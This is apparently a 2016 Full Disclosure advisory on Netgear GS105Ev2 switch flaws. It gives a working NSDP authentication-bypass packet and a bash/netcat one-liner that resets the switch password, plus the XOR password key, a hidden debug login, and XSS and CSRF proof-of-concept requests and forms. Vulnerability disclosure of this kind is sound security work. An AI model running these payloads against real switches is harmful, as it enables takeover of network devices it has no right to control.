@@ -1,0 +1,284 @@
+
+Date: Wed, 27 Jan 2016 15:56:37 +0000
+From: Benedikt Westermann <benedikt.westermann@...ec.tuv.com>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+Subject: [FD] Netgear GS105Ev2 - Multiple Vulnerabilities
+
+# Multiple Vulnerabilities - Netgear GS105Ev2
+
+
+## Product
+
+Vendor: Netgear
+
+Model: GS105Ev2
+
+Firmware version: 1.3.0.3,1.4.0.2
+
+Reference: http://downloadcenter.netgear.com/de/product/GS105Ev2#searchResults
+
+Netgear GS105Ev2 is a Gigabit switch with 5 ports targeting SMBs. The switch can be configured by a web application and a netgear configuration utility. The
+netgear configuration utility uses a proprietary protocol - the so-called Netgear Switch Discovery Protocol (NSDP) - to manage and configure switches. The configuration 
+is protected by a password. 
+
+
+## Status/Metrics/Identifier
+
+Status: unfixed 
+
+CVSS v2 Vector: (AV:A/AC:L/Au:N/C:C/I:C/A:C)
+
+CVSS Score:     8.3
+
+CVE-ID: n/A
+
+The highest risk is represented by the authentication bypass. This is reflected by the score.
+
+## Author/Credits
+
+Benedikt Westermann (TÜV Rheinland i-sec GmbH)
+
+
+## Authentication bypass in NSDP
+
+The implementation of the NSDP on the GS105Ev2 (and possibly also other switches) is flawed. An attacker with access to the broadcast domain of the switch can bypass
+the authentication process. This allows the attacker to gain full control of the switch, i.e., he can modify a particular configuration or flash another firmware to the 
+the switch. 
+
+
+### Detailed Description of the Vulnerability
+
+The NSDP is a simple stateless protocol. It consists of a header, a trailer, and a body consisting of an array of type-length-value triplets. 
+
+The general structure is depicted below.
+
+	/---------------------+----------------------\
+	| 1 byte: version     | 1 byte: packet-type  |     
+	+---------------------+----------------------+
+	| 2 bytes: result     | 4 bytes: reserved    |
+	+---------------------+----------------------+
+	| 6 bytes: src mac    | 6 byte: dest mac     |
+	+---------------------+----------------------+
+	| 2 bytes: reserved   | 2 bytes: sequence no |
+ 	+---------------------+----------------------+
+	|  4 bytes: signature | 2 bytes: reserved    |
+	+---------------------+----------------------+	
+	|  N bytes: TLV       | 2 bytes: 0xFFFF      | 
+	+---------------------+----------------------/
+	|  2 bytes: 0x0000    |
+	\---------------------/
+
+The TLV part is a sequence of type-length-value (TLV) triples. An entry has the following structure:
+
+	/----------------+-------------------+---------------\
+	| 2 bytes: type  |  2 bytes: length l| l bytes: data |
+	\----------------+-------------------+---------------/
+
+Regarding this vulnerability, the following two types are of special importance:
+
+Type 0x0009 - write password
+Type 0x9400 - unknown, but seems to indicate that no authentication is performed.
+
+By sending the following payload to the port 63322 to the IP of the GS105Ev2 switch, the password is changed to "test".  
+
+	|version|type|result|reserved   |src-mac          |dst-mac            
+	 01:     03 : 00:00: 00:00:00:00:3c:97:0e:ee:98:eb:c0:ff:d4:ba:61:fc:
+	
+	|reserved|Sig. (NSDP)   |TLV-type0x9400|TLV-type 0x0009     | Trailer 
+	 00:00:00:78:4e:53:44:50:94:00:00:00:00:09:00:04:3a:11:14:06:ff:ff:00:00
+
+Hereby, the following part is of importance:
+	94:00:00:00:00:09:00:04:3a:11:14:06
+
+The TLV 94:00:00:00 indicates a packet of type 94 with no payload. This followed by the TLV 00:09:00:04:3a:11:14:06. 0x0009 is the type "password change", 0x0004 is
+the length of the password, and 3a:11:14:06 is the "encrypted" password that is about to be set. The "encryption" of the password is done by XORing the password with 
+the string "NtgrSmartSwitchRock". If the password is longer than the secret, the secret is used again.
+
+In case, the password has successfully be set, the switch replies with the following message:
+	01:04:00:00:00:00:00:00:3c:97:0e:ee:98:eb:c0:ff:d4:ba:61:fc:00:00:00:78:4e:53:44:50:00:00:00:00
+
+If the message starts with this prefix 01:04:00:00, the password was changed successfully. This enables an attacker to gain access to the following configuration interfaces:
+- Web interface HTTP://<ip-of-switch>/login.cgi
+- Webinterface http://<ip-of-switch>/loginhidden.cgi with user: Admin1NtgrDebugUser  (e.g.:
+            - http://<ip-of-switch>/bootcode_update.cgi
+            - http://<ip-of-switch>/produce_burn.cgi )
+- Netgear Configuration utility
+
+With this, the configuration can be changed, e.g., enabling a monitoring port, or flashing a new firmware.
+
+The following bash script can be used to change the password to test:
+
+	echo "Please enter IP of switch:"; read ip; echo "";echo "Please enter MAC of switch (e.g. de:ad:de:ad:be:ef) :"; read mac; echo "01:03:00:00:00:00:00:00:3c:97:0e:ee:98:eb:c0:ff:d4:ba:61:fc:00:00:00:78:4e:53:44:50:94:00:00:00:00:09:00:04:3a:11:14:06:ff:ff:00:00" | sed "s/c0:ff:d4:ba:61:fc/$mac/g;s/://g" | xxd -r -p | nc -q 0 -b -u $ip 63322
+
+
+For a switch with the IP 192.168.0.239 and the MAC c0:ff:d4:ba:61:fc, the output (and input) would look like this:
+
+	Please enter IP of switch:
+	192.168.0.239
+
+	Please enter MAC of switch (e.g. de:ad:de:ad:be:ef) :
+	c0:ff:d4:ba:61:fc
+
+If the password is not changed, reboot the switch as this little bash script does not regard the SEQ number.
+
+It should be noted that the authentication bypass is not limited to the "set password" function. Other write functions are also affected by this vulnerability.
+
+Please note that the "encryption" scheme for the password is broken. The encryption string can easily be recovered by a simple XOR operation on a known password (NtgrSmartSwitchRock). Moreover, the Netgear Configuration Utility broadcasts the password to the network. Thus, an attacker within the broadcast domain can eavesdrop and decode the password. This fact was already noted in [Security by Obscurity bei Netgear Switches]. 
+
+[Security by Obscurity bei Netgear Switches]: - http://www.linux-magazin.de/Blogs/Insecurity-Bulletin/Gastbeitrag-Security-by-Obscurity-bei-Netgear-Switches      
+
+
+## Multiple Vulnerabilities in Web-Interface
+
+Though we did not perform a full analysis of the web interface, we noticed that the web interface is prone to several vulnerabilities, i.e., XSS, CSRF, and insufficient protection of the password. 
+
+
+### Detailed Description of the Vulnerabilities
+
+#### XSS
+
+We noticed that the web interface does not properly encode the output. This allows reflected Cross-Site Scripting attacks. The issue can be reproduced with the following request:
+
+	POST /switch_info.cgi HTTP/1.1
+	Host: 192.168.0.239
+	Cookie: SID=EwTVdG\BCCCo\fNUhte]iXsr_psjq^hNdwr\RSXkduf[OXpsveZAeyIp_xx[wFmKdp_ijDDqABZrjlBH
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 110
+
+	switch_name='onclick=alert(1)&dhcpMode=0&ip_address='><Script>alert(&subnet_mask=1)</script>'&gateway_address=
+
+Alternatively, the following HTML-document can be opened to trigger the XSS.
+
+	<html>
+	  <body>
+		<form action="http://192.168.0.239/switch_info.cgi" method="POST">
+		  <input type="hidden" name="switch&#95;name" value="Blubb" />
+		  <input type="hidden" name="dhcpMode" value="0" />
+		  <input type="hidden" name="ip&#95;address" value="&apos;&gt;&lt;Script&gt;alert&#40;" />
+		  <input type="hidden" name="subnet&#95;mask" value="1&#41;&lt;&#47;script&gt;&apos;" />
+		  <input type="hidden" name="gateway&#95;address" value="" />
+		  <input type="submit" value="Submit request" />
+		</form>
+	  </body>
+	</html>
+
+The following fields are affected: IP-Adresse, Netmask, Gateway Address.
+
+
+#### CSRF
+
+In addition, the web application has no protection against Cross-Site request forgery attacks.  With the following PoC, the problem can be reproduced:
+
+	<html>
+	  <body>
+		<form action="http://192.168.0.239/switch_info.cgi" method="POST">
+		  <input type="hidden" name="switch&#95;name" value="CSRF" />
+		  <input type="hidden" name="dhcpMode" value="0" />
+		  <input type="hidden" name="ip&#95;address" value="192&#46;168&#46;0&#46;239" />
+		  <input type="hidden" name="subnet&#95;mask" value="255&#46;255&#46;255&#46;0" />
+		  <input type="hidden" name="gateway&#95;address" value="192&#46;168&#46;0&#46;1" />
+		  <input type="submit" value="Submit request" />
+		</form>
+	  </body>
+	</html>
+
+#### Password Disclosure
+
+Moreover, the backup file of the configuration stores the password in plain, when the web interface is used to create the configuration (fixed with 1.4.0.2). The password, secretPass, is stored in plaintext in the configuration file:
+ 
+	hexdump -C GS105Ev2.cfg
+	00000000  23 79 23 79 00 c0 a8 00  ef ff ff ff 00 c0 a8 00  |#y#y............|
+	00000010  01 00 00 00 00 00 00 61  64 6d 69 6e 00 00 00 00  |.......admin....|
+	00000020  73 65 63 72 65 74 50 61  73 73 00 00 00 00 00 00  |secretPass......|
+	00000030  00 00 00 00 00 00 0f ff  f8 00 0f ff f8 00 0f ff  |................|
+	00000040  f8 00 0f ff f8 00 0f ff  f8 00 0f ff f8 00 0f ff  |................|
+
+CVE-2014-4864 describes the problem for the NSDP protocol.
+
+
+#### Predictable Cookies
+
+Another issue is represented by the session ID which seems to be predictable and related to uptime of the switch. After the first login within a minute after power-on, the following session id is set by the switch. For each new login request, the switch was disconnected from the power supply and reconnected. After some time, the ID changes again.
+
+
+##### Request 1
+
+	POST /login.cgi HTTP/1.1
+	Host: 192.168.0.239
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 13
+
+	password=test
+
+
+##### Response 1
+
+
+	HTTP/1.1 200 OK
+	Connection: close
+	Content-Type: text/html
+	Set-Cookie: SID=EwTVdG\BCCCo\fNUhte]iXsr_psjq^hNdwr\RSXkduf[OXpsveZAeyIp_xx[wFmKdp_ijDDqABZrjlBH;PATH=/
+	Content-Length: 3454
+
+##### Request 2
+
+	POST /login.cgi HTTP/1.1
+	Host: 192.168.0.239
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 13
+
+	password=walla
+
+
+##### Response 2
+
+	HTTP/1.1 200 OK
+	Connection: close
+	Content-Type: text/html
+	Set-Cookie: SID=EwTVdG\BCCCo\fNUhte]iXsr_psjq^hNdwr\RSXkduf[OXpsveZAeyIp_xx[wFmKdp_ijDDqABZrjlBH;PATH=/
+	Content-Length: 3454
+
+##### Request 3
+
+	POST /login.cgi HTTP/1.1
+	Host: 192.168.0.239
+	Content-Type: application/x-www-form-urlencoded
+	Content-Length: 13
+
+	password=secretPass
+
+	
+##### Response 3
+
+	HTTP/1.1 200 OK
+	Connection: close
+	Content-Type: text/html
+	Set-Cookie: SID=EwTVdG\BCCCo\fNUhte]iXsr_psjq^hNdwr\RSXkduf[OXpsveZAeyIp_xx[wFmKdp_ijDDqABZrjlBH;PATH=/
+	Content-Length: 3454
+
+
+	
+## Fixed Versions
+
+No updates are currently available.
+
+Password Disclosure:
+Fixed in version 1.4.0.2
+
+
+## History
+
+10.08.2015 - Initial contact to Netgear via support chat
+10.08.2015 - Set preliminary disclosure date
+11.08.2015 - Netgear Support confirms findings
+01.09.2015 - Netgear Support informs that currently no immediate plans exist to fix the issues
+27.01.2016 - Public disclosure
+
+
+Download attachment "smime.p7s" of type "application/x-pkcs7-signature" (3586 bytes)
+
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
